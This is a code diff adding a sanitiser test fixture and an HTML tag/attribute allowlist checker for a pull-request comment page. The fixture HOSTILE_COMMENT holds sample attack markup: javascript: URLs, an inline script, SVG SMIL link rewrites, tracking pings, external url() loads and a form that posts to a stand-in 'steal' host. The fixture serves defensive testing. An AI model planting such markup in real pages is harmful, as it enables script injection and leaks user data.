@@ -366,6 +366,110 @@ def pull_bodies(origin: Origin) -> dict[int, dict[str, Any]]:
     return pulls
 
 
+# A comment written to attack the pull-request page: markup that loads on render (a
+# stylesheet, images, media, frames, SVG paint servers and filters with `url()`),
+# rewrites a link (SVG SMIL), reaches the application's own styling and document-wide
+# handlers (`class`, `data-*`), names an element for scripts (`id`, `name`), reports a
+# click (`ping`, `attributionsrc`), styles itself, or submits. Its first line is ordinary
+# Markdown that must survive.
+HOSTILE_COMMENT: Final = (
+    "Rebased on `topic`; see [the docs](docs/new.md).\n\n"
+    '<link rel="stylesheet" href="http://127.0.0.1:9/evil.css"><style>p{color:red}</style>\n'
+    '<img src="https://example.com/badge.png" alt="build badge"> <img src="javascript:alert(1)">\n'
+    '<a id="metabrowser" name="settings" href="https://example.com/x" ping="https://e.x/p"'
+    ' attributionsrc="https://e.x/a">x</a>\n'
+    '<svg width="10" height="10"><rect width="10" height="10" fill="url(http://e.x/f#p)"'
+    ' stroke="url(http://e.x/s#p)" marker-start="url(http://e.x/m#p)"'
+    ' filter="url(http://e.x/fi#p)" mask="url(http://e.x/ma#p)"'
+    ' clip-path="url(http://e.x/c#p)"/><use href="#kpress-icon-copy"></use>'
+    '<a href="#x"><set attributeName="href" to="javascript:alert(1)"/>'
+    '<animate attributeName="href" values="javascript:alert(1)"/>s</a></svg>\n'
+    '<div data-kpress-video-id="dQw4w9WgXcQ">video</div>'
+    '<span data-mb-copy="evil" data-nav-dir="up">copy</span>'
+    '<div class="modal-overlay">fake dialog</div>'
+    '<p style="cursor:url(http://e.x/c.png),auto">styled</p>\n'
+    '<form action="https://e.x/steal"><input name="q" src="https://e.x/i.png"></form>'
+    '<iframe src="https://e.x/f"></iframe><video src="https://e.x/v.mp4"></video>'
+    "<script>alert(1)</script>\n"
+)
+
+# The markup the page may insert: its tags and, per tag, its attributes.
+PAGE_TAGS: Final = frozenset(
+    [
+        "a",
+        "b",
+        "blockquote",
+        "br",
+        "code",
+        "dd",
+        "del",
+        "details",
+        "div",
+        "dl",
+        "dt",
+        "em",
+        "h1",
+        "h2",
+        "h3",
+        "h4",
+        "h5",
+        "h6",
+        "hr",
+        "i",
+        "ins",
+        "kbd",
+        "li",
+        "ol",
+        "p",
+        "pre",
+        "s",
+        "span",
+        "strong",
+        "sub",
+        "summary",
+        "sup",
+        "table",
+        "tbody",
+        "td",
+        "tfoot",
+        "th",
+        "thead",
+        "tr",
+        "ul",
+    ]
+)
+PAGE_ATTRIBUTES: Final = {
+    "a": {"href", "target", "rel"},
+    "ol": {"start"},
+    "td": {"colspan", "rowspan", "align"},
+    "th": {"colspan", "rowspan", "align"},
+    "details": {"open"},
+}
+
+
+def allowlist_violations(html: str) -> list[str]:
+    """Every tag and attribute in *html* the page may not insert, parsed as HTML."""
+
+    from html.parser import HTMLParser
+
+    found: list[str] = []
+
+    class _Check(HTMLParser):
+        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+            if tag not in PAGE_TAGS:
+                found.append(f"<{tag}>")
+            for name, value in attrs:
+                if name not in PAGE_ATTRIBUTES.get(tag, set()):
+                    found.append(f"{tag}[{name}]")
+                elif name == "href" and not (value or "").startswith(("https://", "http://")):
+                    found.append(f"{tag}[href={value}]")
+
+    checker = _Check()
+    checker.feed(html)
+    checker.close()
+    return found
+
+
 def page(path: str) -> str:
     return f"{path}?per_page=100&page=1"
 
